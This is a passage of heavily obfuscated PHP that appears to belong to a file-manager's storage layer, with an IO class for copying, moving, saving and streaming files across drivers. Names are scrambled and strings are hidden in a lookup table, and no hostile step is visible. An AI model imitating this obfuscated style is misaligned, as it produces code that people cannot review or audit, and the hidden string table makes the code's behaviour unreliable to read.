(stripos($ãğñÒ¨º, $ö¸Çş´[11]) ? $ö¸Çş´[1221] : $ö¸Çş´[12]) . ($ö¸Çş´[1222] . $ãğñÒ¨º . $ö¸Çş´[1223] . $ğøÙ•´ë); } $õ§‡¿„œ[] = $´®ñ ¡…; } if ($ÒÀ®ºÍ× && !$œ™¼Ø—Ù) { $õ§‡¿„œ = array_merge(array($ö¸Çş´[1219] . $ÒÀ®ºÍ× . $ö¸Çş´[1220]), $õ§‡¿„œ); } $¼Ï²–é = array($ö¸Çş´[1224] . $È­ïµ¡Æ . $ö¸Çş´[1225], $ö¸Çş´[1226] . $È­ïµ¡Æ . $ö¸Çş´[1227], implode($ö¸Çş´[50] . PHP_EOL, $õ§‡¿„œ), $ö¸Çş´[1228]); $ÓØÉ…ş« = implode(PHP_EOL, $¼Ï²–é); if ($ŸöŞäÁ” && $ŸöŞäÁ” == $ö¸Çş´[879]) { return $ÓØÉ…ş«; } $Ûì¯š»‹ = array($ö¸Çş´[879] => $ÓØÉ…ş«, $ö¸Çş´[13] => $â‰ËÑ¨¥); return $ŸöŞäÁ” ? $Ûì¯š»‹[$ŸöŞäÁ”] : $Ûì¯š»‹; } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($ƒ¬ªŸûÌ, $€ãŞãùƒ) { $§ç½œÀÚ =& $_SERVER[ÔÕ±ĞšÎ]; $Òá Ì±¶ = $€ãŞãùƒ; $GLOBALS[$§ç½œÀÚ[1229]] = $§ç½œÀÚ[1230] . $ƒ¬ªŸûÌ; Hook::trigger($§ç½œÀÚ[1230] . $ƒ¬ªŸûÌ . $§ç½œÀÚ[1231], $Òá Ì±¶); $øØÊÖÈ¬ = self::driverMake($€ãŞãùƒ[0]); if (!$øØÊÖÈ¬) { return !1; } if (method_exists($øØÊÖÈ¬, $ƒ¬ªŸûÌ)) { $ıèàüŠ = @call_user_func_array(array($øØÊÖÈ¬, $ƒ¬ªŸûÌ), $€ãŞãùƒ); } else { if (method_exists($øØÊÖÈ¬, $§ç½œÀÚ[1232])) { $ıèàüŠ = @call_user_func_array(array($øØÊÖÈ¬, $ƒ¬ªŸûÌ), $€ãŞãùƒ); } else { if (method_exists(self, $ƒ¬ªŸûÌ)) { $ıèàüŠ = @call_user_func_array(array(self, $ƒ¬ªŸûÌ), $€ãŞãùƒ); } else { $ıèàüŠ = call_user_func_array(array(parent, $ƒ¬ªŸûÌ), $€ãŞãùƒ); } } } Hook::trigger($§ç½œÀÚ[1230] . $ƒ¬ªŸûÌ . $§ç½œÀÚ[1233], $Òá Ì±¶, $ıèàüŠ); return $ıèàüŠ; } public static function init($¯ËØˆâç) { return self::driverMake($¯ËØˆâç); } public static function copy($ğ²Ş¾áƒ, $³‹¾ä§¤, $ ã‰€©È = false, $Ÿ£‡Ù“½ = false) { return self::copyMoveStart($ğ²Ş¾áƒ, $³‹¾ä§¤, $ ã‰€©È, $_SERVER[ÔÕ±ĞšÎ][623], $Ÿ£‡Ù“½); } public static function move($Ÿœæ÷ŠÛ, $‚÷¦·óã, $à‘°é¾Â = false, $µè¨Ğ® = false) { return self::copyMoveStart($Ÿœæ÷ŠÛ, $‚÷¦·óã, $à‘°é¾Â, $_SERVER[ÔÕ±ĞšÎ][625], $µè¨Ğ®); } public static function copyMoveChildren($ïğ¢í®, $î¥ê˜¶, $±»­”º½ = "\x63\157\x70\171", $áç´¸Ÿû = REPEAT_REPLACE) { $ÛÛš‰ØÀ =& $_SERVER[ÔÕ±ĞšÎ]; $æëèÛ¥– = $ïğ¢í®; $Øéğ¸ = self::driverMake($ïğ¢í®); $íŠÊÀÅ¯ = $Øéğ¸->listPath($ïğ¢í®, !0); $“¬ñÇ÷ = array_merge($íŠÊÀÅ¯[$ÛÛš‰ØÀ[86]], $íŠÊÀÅ¯[$ÛÛš‰ØÀ[85]]); foreach ($“¬ñÇ÷ as $Ì‘º¼Ò») { self::copyMoveStart($Ì‘º¼Ò»[$ÛÛš‰ØÀ[87]], $î¥ê˜¶, $áç´¸Ÿû, $±»­”º½, !1); } if ($±»­”º½ == $ÛÛš‰ØÀ[625]) { self::remove($æëèÛ¥–); } } private static function copyMoveStart($ÛÁùùË¼, $ØÜú‹“æ, $øÚä¶ÉÚ, $»İ® ¸, $îàØ’°ü) { $Áãúµª¢ =& $_SERVER[ÔÕ±ĞšÎ]; $ö¤†Ü‹Å = array($ÛÁùùË¼, $ØÜú‹“æ, $øÚä¶ÉÚ, $îàØ’°ü); Hook::trigger($Áãúµª¢[1230] . $»İ® ¸ . $Áãúµª¢[1231], $ö¤†Ü‹Å); $äÛ˜…Á® = self::copyMove($ÛÁùùË¼, $ØÜú‹“æ, $øÚä¶ÉÚ, $»İ® ¸, $îàØ’°ü); Hook::trigger($Áãúµª¢[1230] . $»İ® ¸ . $Áãúµª¢[1233], $ö¤†Ü‹Å, $äÛ˜…Á®); return $äÛ˜…Á®; } public static function saveFile($ııúã‰, $¡ùÂÒ¯, $‹ïü‡›ş = true) { $¨Æê¢¡Å =& $_SERVER[ÔÕ±ĞšÎ]; $ĞÛ­Ü÷ = self::info($¡ùÂÒ¯); $…õÌÓğ” = self::driverMake($ııúã‰); $ªëãú™ = self::driverMake($¡ùÂÒ¯); $ŸÊÎÑı¤ = !1; if ($ªëãú™->pathParse[$¨Æê¢¡Å[1234]]) { $ŸÊÎÑı¤ = $ªëãú™; $íÃÒáÖ = $ªëãú™->pathParse[$¨Æê¢¡Å[1234]]; $ªëãú™ = self::driverMake($íÃÒáÖ); } if ($…õÌÓğ”->pathParse[$¨Æê¢¡Å[1234]]) { $¥ßßùúÕ = $…õÌÓğ”->pathParse[$¨Æê¢¡Å[1234]]; $…õÌÓğ” = self::driverMake($¥ßßùúÕ); } $ìÏõé‹ = $ªëãú™->pathFather($¡ùÂÒ¯); $‹ü—‘Ó = !0; if (!$‹ïü‡›ş && self::driverIsSame($…õÌÓğ”, $ªëãú™)) { $‹ü—‘Ó = !1; } $§Áƒ¥âè = self::copyFile($…õÌÓğ”, $ııúã‰, $ªëãú™, $ìÏõé‹, $ĞÛ­Ü÷[$¨Æê¢¡Å[32]], $‹ü—‘Ó); if ($ŸÊÎÑı¤) { $§Áƒ¥âè = $ŸÊÎÑı¤->getPathOuter($§Áƒ¥âè); } return $§Áƒ¥âè; } private static function copyMove($ô¤¶—¡µ, $ÊÙšî ™, $À¤„–¿î, $£åªÕ÷Ú, $¹ÚóÚ´¥ = false) { $Òª¾è“ =& $_SERVER[ÔÕ±ĞšÎ]; if (!$ô¤¶—¡µ || $ô¤¶—¡µ == $Òª¾è“[8] || !$ÊÙšî ™) { return !1; } ignore_timeout(); $ğÒªã¥– = self::driverMake($ô¤¶—¡µ); $Øé³±ŸŒ = self::driverMake($ÊÙšî ™); $‰íÄ¡’š = $£åªÕ÷Ú == $Òª¾è“[625]; $ÌãÒÒ–Ï = !1; if ($Øé³±ŸŒ->pathParse[$Òª¾è“[1234]]) { $ÌãÒÒ–Ï = $Øé³±ŸŒ; $ÊÙšî ™ = $Øé³±ŸŒ->pathParse[$Òª¾è“[1234]]; $Øé³±ŸŒ = self::driverMake($ÊÙšî ™); } if ($ğÒªã¥–->pathParse[$Òª¾è“[1234]]) { $ô¤¶—¡µ = $ğÒªã¥–->pathParse[$Òª¾è“[1234]]; $ğÒªã¥– = self::driverMake($ô¤¶—¡µ); } self::check($ğÒªã¥–, $ô¤¶—¡µ, $Øé³±ŸŒ, $ÊÙšî ™); Hook::trigger($Òª¾è“[1235], $ğÒªã¥–, $ô¤¶—¡µ, $Øé³±ŸŒ, $ÊÙšî ™); $îİ™¶÷ = self::driverIsSame($ğÒªã¥–, $Øé³±ŸŒ); if ($îİ™¶÷) { if ($£åªÕ÷Ú == $Òª¾è“[625] && !method_exists($Øé³±ŸŒ, $Òª¾è“[1236]) && trim($ÊÙšî ™, $Òª¾è“[8]) == trim($Øé³±ŸŒ->pathFather($ô¤¶—¡µ), $Òª¾è“[8])) { if ($ğÒªã¥–->pathThis($ô¤¶—¡µ) != $¹ÚóÚ´¥ && !$ğÒªã¥–->isOsDriver()) { return $ğÒªã¥–->rename($ô¤¶—¡µ, $¹ÚóÚ´¥); } return $Øé³±ŸŒ->getPathOuter($ô¤¶—¡µ); } if (method_exists($Øé³±ŸŒ, $£åªÕ÷Ú)) { return $Øé³±ŸŒ->{$£åªÕ÷Ú}($ô¤¶—¡µ, $ÊÙšî ™, $À¤„–¿î, $¹ÚóÚ´¥); } } if ($îİ™¶÷ && $£åªÕ÷Ú == $Òª¾è“[625] && $Øé³±ŸŒ->getType() == $Òª¾è“[109]) { $áÆæ¢šº = $Øé³±ŸŒ->movePath($ô¤¶—¡µ, $ÊÙšî ™, $¹ÚóÚ´¥); if ($áÆæ¢šº) { return $áÆæ¢šº; } } $²±ˆÄ¨– = $ğÒªã¥–->isFile($ô¤¶—¡µ); if (!$²±ˆÄ¨– && $Øé³±ŸŒ->getType() == $Òª¾è“[831] && $ğÒªã¥–->getType() == $Òª¾è“[109]) { $áÆæ¢šº = $Øé³±ŸŒ->copyFolderFromIO($ğÒªã¥–, $ô¤¶—¡µ, $ÊÙšî ™, $À¤„–¿î, $‰íÄ¡’š, $¹ÚóÚ´¥); } else { $áÆæ¢šº = self::copyPath($ğÒªã¥–, $ô¤¶—¡µ, $Øé³±ŸŒ, $ÊÙšî ™, $À¤„–¿î, $‰íÄ¡’š, $²±ˆÄ¨–, $¹ÚóÚ´¥); } if ($áÆæ¢šº && $‰íÄ¡’š) { $ğÒªã¥–->remove($ô¤¶—¡µ); } if ($ÌãÒÒ–Ï) { $áÆæ¢šº = $ÌãÒÒ–Ï->getPathOuter($áÆæ¢šº); } return $áÆæ¢šº; } private static function check($¶«»¹Š¸, $“ÑÓÑ‹ğ, $óò€ã­„, &$ÚÓ®ÉÏ¥) { $—ñ©¾‡¡ =& $_SERVER[ÔÕ±ĞšÎ]; if (self::driverIsSame($¶«»¹Š¸, $óò€ã­„) && $¶«»¹Š¸->isFolder($“ÑÓÑ‹ğ) && $¶«»¹Š¸->isParentOf($“ÑÓÑ‹ğ, $ÚÓ®ÉÏ¥)) { show_json(LNG($—ñ©¾‡¡[1237]), !1); } if (!$¶«»¹Š¸->exist($“ÑÓÑ‹ğ)) { show_json(LNG($—ñ©¾‡¡[108]), !1); } } private static function copyPath($£‡¤Ù—Ä, $Ò±™™ì´, $Àíµ¹Š, $°ÁÙÓœ«, $Œ…ˆæ–‡, $£‰ÚÚ‚—, $ë‘À¤¢, $‘ÜÄŠ  = false, $ãğŞ« = true) { $È®ßŠÙí =& $_SERVER[ÔÕ±ĞšÎ]; $ÚœØ²Ì¸ = empty($‘ÜÄŠ ) && $‘ÜÄŠ  !== $È®ßŠÙí[230] ? $£‡¤Ù—Ä->pathThis($Ò±™™ì´) : $‘ÜÄŠ ; if ($Œ…ˆæ–‡) { $¶ó“£Ÿ› = $Àíµ¹Š->fileNameExist($°ÁÙÓœ«, $ÚœØ²Ì¸); $â·Š°îƒ = $ÚœØ²Ì¸; $ÚœØ²Ì¸ = $Àíµ¹Š->fileNameAuto($°ÁÙÓœ«, $ÚœØ²Ì¸, $Œ…ˆæ–‡, !$ë‘À¤¢); if (!$¶ó“£Ÿ› || $â·Š°îƒ != $ÚœØ²Ì¸) { $Œ…ˆæ–‡ = !1; } if ($ãğŞ« && !$Œ…ˆæ–‡) { $Àíµ¹Š->_data[$È®ßŠÙí[1238]] = !0; } } if ($ë‘À¤¢) { return self::copyFile($£‡¤Ù—Ä, $Ò±™™ì´, $Àíµ¹Š, $°ÁÙÓœ«, $ÚœØ²Ì¸, $£‰ÚÚ‚—); } if ($Œ…ˆæ–‡ == REPEAT_RENAME_FOLDER) { $Œ…ˆæ–‡ = !1; } $ß°ù¤¯œ = rtrim($°ÁÙÓœ«, $È®ßŠÙí[8]) . $È®ßŠÙí[8] . $ÚœØ²Ì¸; $ÄøÄîŠŞ = $Àíµ¹Š->mkdir($Àíµ¹Š->getPath($ß°ù¤¯œ), $Œ…ˆæ–‡); $°ÁÙÓœ« = $Àíµ¹Š->getPathInner($ÄøÄîŠŞ); $Ş¾·ÅÔÕ = $£‡¤Ù—Ä->listPath($Ò±™™ì´, !0); $Ş¾·ÅÔÕ = is_array($Ş¾·ÅÔÕ) ? $Ş¾·ÅÔÕ : array($È®ßŠÙí[86] => array(), $È®ßŠÙí[85] => array()); $­©‡ì¾† = array_merge($Ş¾·ÅÔÕ[$È®ßŠÙí[86]], $Ş¾·ÅÔÕ[$È®ßŠÙí[85]]); foreach ($­©‡ì¾† as $±›‚üÀ) { $€î‘¨Èã = $±›‚üÀ[$È®ßŠÙí[33]] == $È®ßŠÙí[232]; $Ò±™™ì´ = $£‡¤Ù—Ä->getPathInner($±›‚üÀ[$È®ßŠÙí[87]]); $Ü×íÍ× = self::copyPath($£‡¤Ù—Ä, $Ò±™™ì´, $Àíµ¹Š, $°ÁÙÓœ«, $Œ…ˆæ–‡, $£‰ÚÚ‚—, $€î‘¨Èã, !1, !1); if (!$Ü×íÍ×) { IO::errorTips($È®ßŠÙí[1239] . $Ò±™™ì´ . $È®ßŠÙí[73] . $°ÁÙÓœ«); } } self::copyMoveKeepInfo($£‡¤Ù—Ä, $Ò±™™ì´, $ÄøÄîŠŞ); return $ÄøÄîŠŞ; } private static function copyFile($›èÚìÓµ, $ğ¤ïŠş¸, $ĞË¦–ò«, $ãÖò‘ª, $·ÍªËÁÅ, $Ô‰ˆ³Ú‡) { $ï÷ÆäÍ =& $_SERVER[ÔÕ±ĞšÎ]; $ãÖò‘ª = $ĞË¦–ò«->getPath(rtrim($ãÖò‘ª, $ï÷ÆäÍ[8]) . $ï÷ÆäÍ[8] . $·ÍªËÁÅ); $¸¯£ôìş = $ï÷ÆäÍ[1240] . time() . rand_string(5); Hook::trigger($ï÷ÆäÍ[1241], $›èÚìÓµ, $ğ¤ïŠş¸, $ĞË¦–ò«, $ãÖò‘ª, $·ÍªËÁÅ, $¸¯£ôìş); if (self::driverIsSame($›èÚìÓµ, $ĞË¦–ò«)) { if ($Ô‰ˆ³Ú‡) { $×İá°¤’ = $ĞË¦–ò«->moveFile($ğ¤ïŠş¸, $ãÖò‘ª); } else { $×İá°¤’ = $ĞË¦–ò«->copyFile($ğ¤ïŠş¸, $ãÖò‘ª); } Hook::trigger($ï÷ÆäÍ[1242], $›èÚìÓµ, $ğ¤ïŠş¸, $ĞË¦–ò«, $ãÖò‘ª, $·ÍªËÁÅ, $×İá°¤’); self::copyMoveKeepInfo($›èÚìÓµ, $ğ¤ïŠş¸, $×İá°¤’); return $×İá°¤’; } $ºöòıŠ = TEMP_FILES; if ($GLOBALS[$ï÷ÆäÍ[6]][$ï÷ÆäÍ[92]][$ï÷ÆäÍ[871]]) { $ºöòıŠ = $GLOBALS[$ï÷ÆäÍ[6]][$ï÷ÆäÍ[92]][$ï÷ÆäÍ[871]]; } $óßµÀú« = $ºöòıŠ; mk_dir($óßµÀú«); $àÊ¤â¡ = $óßµÀú« . $¸¯£ôìş; $›øÆªÈ = $àÊ¤â¡; $àÊ¤â¡ = $›èÚìÓµ->download($ğ¤ïŠş¸, $àÊ¤â¡); $àÊ¤â¡ = $›èÚìÓµ->iconvApp($àÊ¤â¡); if (substr($àÊ¤â¡, strlen($ºöòıŠ)) == $ºöòıŠ) { $Ô‰ˆ³Ú‡ = !0; } $×İá°¤’ = $ĞË¦–ò«->upload($ãÖò‘ª, $àÊ¤â¡, $Ô‰ˆ³Ú‡); self::remove($›øÆªÈ); Hook::trigger($ï÷ÆäÍ[1242], $›èÚìÓµ, $ğ¤ïŠş¸, $ĞË¦–ò«, $ãÖò‘ª, $·ÍªËÁÅ, $×İá°¤’); self::copyMoveKeepInfo($›èÚìÓµ, $ğ¤ïŠş¸, $×İá°¤’); return $×İá°¤’; } private static function copyMoveKeepInfo($ì­ˆ¿¢§, $«„ƒ³Ëœ, $š¡åšŞ¿) { if (!$š¡åšŞ¿) { return; } $½ô¿áá„ = $ì­ˆ¿¢§->info($«„ƒ³Ëœ); if (!is_array($½ô¿áá„)) { return; } IO::setModifyTime($š¡åšŞ¿, $½ô¿áá„[$_SERVER[ÔÕ±ĞšÎ][88]]); } public static function pathFather($œ¯èøÂ¥) { $Ëş¡×ÑÔ = IO::init($œ¯èøÂ¥); $¢Ûâóş = $Ëş¡×ÑÔ->pathFather($Ëş¡×ÑÔ->path); return $Ëş¡×ÑÔ->getPathOuter($¢Ûâóş); } public static function fileOut($¥ì±Âôş, $©Ä² = false, $¦‘ÛáöÜ = false, $÷ï™„ö› = '') { $àÂ¸ß½ş = self::driverMake($¥ì±Âôş); if ($àÂ¸ß½ş->isFileOutServer()) { return $àÂ¸ß½ş->fileOutServer($¥ì±Âôş, $©Ä², $¦‘ÛáöÜ, $÷ï™„ö›); } return $àÂ¸ß½ş->fileOut($¥ì±Âôş, $©Ä², $¦‘ÛáöÜ, $÷ï™„ö›); } public static function fileOutImage($×É¥–Ä, $ÌÉ¦ŞµË = 250) { $Å’Ô¤à´ = array(250, 600, 1200, 2000, 3000, 5000); for ($ã‚Ò­‰¨ = 0; $ã‚Ò­‰¨ < count($Å’Ô¤à´); $ã‚Ò­‰¨++) { if ($ã‚Ò­‰¨ == 0 && $ÌÉ¦ŞµË <= $Å’Ô¤à´[$ã‚Ò­‰¨]) { $ÌÉ¦ŞµË = $Å’Ô¤à´[$ã‚Ò­‰¨]; break; } else { if ($ÌÉ¦ŞµË > $Å’Ô¤à´[$ã‚Ò­‰¨ - 1] && $ÌÉ¦ŞµË <= $Å’Ô¤à´[$ã‚Ò­‰¨]) { $ÌÉ¦ŞµË = $Å’Ô¤à´[$ã‚Ò­‰¨]; break; } else { if ($ã‚Ò­‰¨ == count($Å’Ô¤à´) - 1 && $ÌÉ¦ŞµË > $Å’Ô¤à´[$ã‚Ò­‰¨]) { $ÌÉ¦ŞµË = $Å’Ô¤à´[$ã‚Ò­‰¨]; break; } } } } $›ÙˆË¡ = self::driverMake($×É¥–Ä); if ($›ÙˆË¡->isFileOutServer()) { return $›ÙˆË¡->fileOutImageServer($×É¥–Ä, $ÌÉ¦ŞµË); } return $›ÙˆË¡->fileOutImage($×É¥–Ä, $ÌÉ¦ŞµË); } private static function driverIsSame($“†ïßØë, $‘ÀÙ¿²) { $ş‚æÓœ =& $_SERVER[ÔÕ±ĞšÎ]; $‡ô•ŞÅ = $“†ïßØë->getType(); $ìš¡Öß = $‘ÀÙ¿²->getType(); if ($‡ô•ŞÅ != $ìš¡Öß) { return !1; } if ($‡ô•ŞÅ == $ş‚æÓœ[831]) { return !0; } if ($‡ô•ŞÅ == $ş‚æÓœ[109]) { return !0; } if ($“†ïßØë->pathDriver == $‘ÀÙ¿²->pathDriver) { return !0; } return !1; } public static function copyUpdate($ñşóÓ­û, $ÅïÌ°å) { $Ï—˜ÅÛ‹ =& $_SERVER[ÔÕ±ĞšÎ]; if (!IO::exist($ñşóÓ­û)) { return !1; } if (!IO::exist($ÅïÌ°å)) { IO::mkdir($ÅïÌ°å); } $íàûÄ› = array_to_keyvalue(self::listAllSimple($ñşóÓ­û), $Ï—˜ÅÛ‹[87]); $ŒÆ°Î˜ = array_to_keyvalue(self::listAllSimple($ÅïÌ°å), $Ï—˜ÅÛ‹[87]); $ìƒ©£îÛ = array(); $Ô‰°èæ = array(); foreach ($íàûÄ› as $şœø¨ƒÄ => $ö²“îá) { if (isset($ŒÆ°Î˜[$şœø¨ƒÄ])) { if ($ö²“îá[$Ï—˜ÅÛ‹[78]] == 1) { continue; } if ($ŒÆ°Î˜[$şœø¨ƒÄ][$Ï—˜ÅÛ‹[79]] == $ö²“îá[$Ï—˜ÅÛ‹[79]]) { continue; } } if ($ö²“îá[$Ï—˜ÅÛ‹[78]] == 1) { $Ô‰°èæ[] = $ÅïÌ°å . $Ï—˜ÅÛ‹[8] . trim($şœø¨ƒÄ, $Ï—˜ÅÛ‹[8]); continue; } $ô¥İÊÓ” = strstr(trim($şœø¨ƒÄ, $Ï—˜ÅÛ‹[8]), $Ï—˜ÅÛ‹[8]) ? get_path_father($şœø¨ƒÄ) : $Ï—˜ÅÛ‹[12]; $ìƒ©£îÛ[] = array($Ï—˜ÅÛ‹[1243] => $ö²“îá[$Ï—˜ÅÛ‹[89]], $Ï—˜ÅÛ‹[1244] => rtrim($ÅïÌ°å, $Ï—˜ÅÛ‹[8]) . $Ï—˜ÅÛ‹[8] . $ô¥İÊÓ”, $Ï—˜ÅÛ‹[1245] => $ö²“îá); } $òææù¶Ã = array($Ï—˜ÅÛ‹[232] => $ìƒ©£îÛ, $Ï—˜ÅÛ‹[78] => $Ô‰°èæ); Hook::trigger($Ï—˜ÅÛ‹[1246], $ñşóÓ­û, $ÅïÌ°å, $òææù¶Ã); foreach ($Ô‰°èæ as $ö²“îá) { IO::mkdir($ö²“îá); } foreach ($ìƒ©£îÛ as $ö²“îá) { IO::copy($ö²“îá[$Ï—˜ÅÛ‹[1243]], $ö²“îá[$Ï—˜ÅÛ‹[1244]], REPEAT_REPLACE); } } public static function fileSubstr($œ¸Á²Ü, $·«İœÖ‰, $Ûë©†ÄÃ = false) { $Åüæšš¹ =& $_SERVER[ÔÕ±ĞšÎ]; $Ã÷Ú±Øı = self::driverMake($œ¸Á²Ü); $ÕÏ´£· = $Ã÷Ú±Øı->size($œ¸Á²Ü); $äƒâáÈ = $·«İœÖ‰; $ÎÕÅŞÎ³ = $Ûë©†ÄÃ; if ($·«İœÖ‰ < 0) { $·«İœÖ‰ = $ÕÏ´£· + $·«İœÖ‰; } if ($Ûë©†ÄÃ === !1) { $Ûë©†ÄÃ = $ÕÏ´£· - $·«İœÖ‰; } if ($·«İœÖ‰ + $Ûë©†ÄÃ > $ÕÏ´£·) { $Ûë©†ÄÃ = $ÕÏ´£· - $·«İœÖ‰; } if (!$ÕÏ´£· && $Ã÷Ú±Øı->getType() == $Åüæšš¹[109] && !$Ã÷Ú±Øı->exist($œ¸Á²Ü)) { $„€Ä±ê = get_path_this($œ¸Á²Ü); $¬œÎÕ§ = parse_url_query($„€Ä±ê); if (is_array($¬œÎÕ§) && isset($¬œÎÕ§[$Åüæšš¹[32]])) { $„€Ä±ê = urldecode($¬œÎÕ§[$Åüæšš¹[32]]); } throw new Exception($Åüæšš¹[1247] . LNG($Åüæšš¹[1248]) . $Åüæšš¹[1045] . clear_html($„€Ä±ê) . $Åüæšš¹[12]); } if ($Ûë©†ÄÃ <= 0) { return $Åüæšš¹[12]; } if ($·«İœÖ‰ < 0 || $·«İœÖ‰ >= $ÕÏ´£· || $Ûë©†ÄÃ > 1024 * 1024 * 10) { throw new Exception("\146\151\x6c\x65\122\x65\141\x64\40\145\162\x72\157\162\41\40\163\164\141\162\x74\75{$·«İœÖ‰}\x3b\x6c\145\x6e\x67\164\x68\x3d{$Ûë©†ÄÃ}\73\40\x73\151\172\x65\75{$ÕÏ´£·}\x3b"); } $¬¶·ÈÛ = $Ã÷Ú±Øı->fileSubstr($œ¸Á²Ü, $·«İœÖ‰, $Ûë©†ÄÃ); if (!$¬¶·ÈÛ && $Ûë©†ÄÃ && isset($GLOBALS[$Åüæšš¹[1249]])) { throw new Exception($GLOBALS[$Åüæšš¹[1249]][$Åüæšš¹[1250]]); } return $¬¶·ÈÛ; } private static function driverMake(&$šå”Êâô) { $­¯×ÊÂ¶ =& $_SERVER[ÔÕ±ĞšÎ]; $Üæ€¼ìÇ = KodIO::parse($šå”Êâô); if (!self::$driverListSystem) { $ÀîÓç« = Model($­¯×ÊÂ¶[841])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($ÀîÓç«, $­¯×ÊÂ¶[477]); } if ($Üæ€¼ìÇ[$­¯×ÊÂ¶[33]] == KodIO::KOD_IO && !self::$driverListSystem[$Üæ€¼ìÇ[$­¯×ÊÂ¶[477]]]) { throw new Exception($­¯×ÊÂ¶[1251]); return !1; } $šå”Êâô = $Üæ€¼ìÇ[$­¯×ÊÂ¶[1252]]; $©‹äœ€ = self::driverGet($Üæ€¼ìÇ, $šå”Êâô); return $©‹äœ€; } private static function driverGet($«‹˜“¨ç, &$ä¼Ş˜©Ø) { $ƒ²×À¤— =& $_SERVER[ÔÕ±ĞšÎ]; $ÕÄü“ç = $«‹˜“¨ç[$ƒ²×À¤—[1253]]; $½­´„†† = $«‹˜“¨ç[$ƒ²×À¤—[477]]; switch ($«‹˜“¨ç[$ƒ²×À¤—[33]]) { case KodIO::KOD_IO: $Ú˜–ßÔ = self::$driverListSystem[$½­´„††]; break; case KodIO::KOD_SOURCE: $ä¼Ş˜©Ø = $½­´„†† . $ä¼Ş˜©Ø; $Ú˜–ßÔ = array($ƒ²×À¤—[1254] => $ƒ²×À¤—[1255], $ƒ²×À¤—[6] => $«‹˜“¨ç); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $Ä¿ÇÇ = $GLOBALS[$ƒ²×À¤—[1256]]; self::$driverListUser = array_to_keyvalue($Ä¿ÇÇ, $ƒ²×À¤—[477]); } $Ú˜–ßÔ = self::$driverListUser[$½­´„††]; break; case KodIO::KOD_SHARE_LINK: $Ú˜–ßÔ = array($ƒ²×À¤—[1254] => $ƒ²×À¤—[1257], $ƒ²×À¤—[6] => $«‹˜“¨ç); $ûÌĞ¹¬Œ = Action($ƒ²×À¤—[1258])->sharePathInfo($«‹˜“¨ç[$ƒ²×À¤—[87]]); $ä¼Ş˜©Ø = $ûÌĞ¹¬Œ[$ƒ²×À¤—[193]]; if (!$ûÌĞ¹¬Œ[$ƒ²×À¤—[193]]) { $ù°ÆŒ‚ = Model($ƒ²×À¤—[669])->getInfo($ûÌĞ¹¬Œ[$ƒ²×À¤—[670]]); $ä¼Ş˜©Ø = KodIO::clear($ù°ÆŒ‚[$ƒ²×À¤—[1259]] . $«‹˜“¨ç[$ƒ²×À¤—[1252]]); $«‹˜“¨ç[$ƒ²×À¤—[562]] = $ù°ÆŒ‚; $«‹˜“¨ç[$ƒ²×À¤—[1234]] = $ä¼Ş˜©Ø; $Ú˜–ßÔ = array($ƒ²×À¤—[1254] => $ƒ²×À¤—[1260], $ƒ²×À¤—[6] => $«‹˜“¨ç); } break; case KodIO::KOD_SHARE_ITEM: $Ú˜–ßÔ = array($ƒ²×À¤—[1254] => $ƒ²×À¤—[1261], $ƒ²×À¤—[6] => $«‹˜“¨ç); $ù°ÆŒ‚ = Model($ƒ²×À¤—[669])->getInfo($«‹˜“¨ç[$ƒ²×À¤—[477]]); if ($ù°ÆŒ‚[$ƒ²×À¤—[193]] == $ƒ²×À¤—[230]) { $ä¼Ş˜©Ø = KodIO::clear($ù°ÆŒ‚[$ƒ²×À¤—[1259]] . $«‹˜“¨ç[$ƒ²×À¤—[1252]]); $«‹˜“¨ç[$ƒ²×À¤—[562]] = $ù°ÆŒ‚; $«‹˜“¨ç[$ƒ²×À¤—[1234]] = $ä¼Ş˜©Ø; $Ú˜–ßÔ = array($ƒ²×À¤—[1254] => $ƒ²×À¤—[1262], $ƒ²×À¤—[6] => $«‹˜“¨ç); } else { if (!$ä¼Ş˜©Ø) { $ä¼Ş˜©Ø = $ù°ÆŒ‚[$ƒ²×À¤—[193]]; } } break; default: $ä¼Ş˜©Ø = $«‹˜“¨ç[$ƒ²×À¤—[87]]; $Ú˜–ßÔ = array($ƒ²×À¤—[1254] => $ƒ²×À¤—[1263]); break; } $ñ²…™é = $«‹˜“¨ç[$ƒ²×À¤—[87]]; if (!isset(self::$driverCache[$ñ²…™é])) { $Î®õŸ ± = strtolower($Ú˜–ßÔ[$ƒ²×À¤—[98]]); $é£•‘Ñ = $GLOBALS[$ƒ²×À¤—[6]][$ƒ²×À¤—[92]][$ƒ²×À¤—[900]]; $ÃêµÇà« = $ƒ²×À¤—[77] . (isset($é£•‘Ñ[$Î®õŸ ±]) ? $é£•‘Ñ[$Î®õŸ ±] : ucfirst($Î®õŸ ±)); if (!class_exists($ÃêµÇà«)) { show_json("{$ÃêµÇà«}\40\x6e\x6f\x74\40\145\170\151\x73\x74\163\41", !1); } $ò¡äæƒÃ = isset($Ú˜–ßÔ[$ƒ²×À¤—[6]]) ? $Ú˜–ßÔ[$ƒ²×À¤—[6]] : !1; self::$driverCache[$ñ²…™é] = new $ÃêµÇà«($ò¡äæƒÃ); } $áØ™Õ¶Û = self::$driverCache[$ñ²…™é]; $áØ™Õ¶Û->pathDriver = $ÕÄü“ç; $áØ™Õ¶Û->pathBase = $ƒ²×À¤—[12]; if (isset($Ú˜–ßÔ[$ƒ²×À¤—[6]][$ƒ²×À¤—[1264]])) { $áØ™Õ¶Û->pathBase = rtrim($Ú˜–ßÔ[$ƒ²×À¤—[6]][$ƒ²×À¤—[1264]], $ƒ²×À¤—[8]) . $ƒ²×À¤—[8]; $ä¼Ş˜©Ø = $áØ™Õ¶Û->pathBase . ltrim($ä¼Ş˜©Ø, $ƒ²×À¤—[8]); } $ä¼Ş˜©Ø = $áØ™Õ¶Û->getPath($ä¼Ş˜©Ø); if (isset($«‹˜“¨ç[$ƒ²×À¤—[1234]])) { $ä¼Ş˜©Ø = $«‹˜“¨ç[$ƒ²×À¤—[1234]]; } $áØ™Õ¶Û->path = $ä¼Ş˜©Ø; return $áØ™Õ¶Û; } public static function errorTips($Ï°§«¬æ = false) { $ú±ÌŞš’ =& $_SERVER[ÔÕ±ĞšÎ]; static $Ë›µ±º = array(); $€ÉÏ³Å = 1000; if ($Ï°§«¬æ === -1) { return $Ë›µ±º ? $Ë›µ±º[count($Ë›µ±º) - 1] : $ú±ÌŞš’[12]; } if ($Ï°§«¬æ === !1) { return implode($ú±ÌŞš’[287], $Ë›µ±º); } if (count($Ë›µ±º) >= $€ÉÏ³Å) { 